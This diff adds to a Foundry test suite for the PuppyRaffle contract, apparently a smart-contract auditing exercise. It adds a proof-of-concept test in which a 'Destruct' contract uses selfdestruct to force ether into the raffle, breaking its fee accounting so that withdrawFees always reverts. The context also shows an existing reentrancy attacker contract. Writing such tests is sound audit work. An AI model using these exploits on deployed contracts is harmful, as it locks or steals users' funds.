@@ -281,6 +281,25 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+    function testMishandlingFeesInWithrawFees() public playersEntered {
+        // finish the raffle to allow fees withdrawal
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        uint256 contractBalanceBefore = address(puppyRaffle).balance;
+        uint256 totalFeesBefore = puppyRaffle.totalFees();
+        console.log("contract balance before:", contractBalanceBefore);
+        console.log("total fees before:", totalFeesBefore);
+        assertEq(contractBalanceBefore, totalFeesBefore);
+
+        Destruct attacker = new Destruct();
+        attacker.attack{value: 1 ether}(address(puppyRaffle));
+        assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees(), "Destruct cause mismatch in balances");
+
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
 
     //////////////////////
     /// Reentrancy attack on refund function     ///
@@ -341,5 +360,10 @@ contract ReentrancyAttacker {
     }
     receive() external payable {
         _stealMoney();
+    }
+}
+contract Destruct {
+    function attack(address target) external payable {
+        selfdestruct(payable(target));
     }
 }
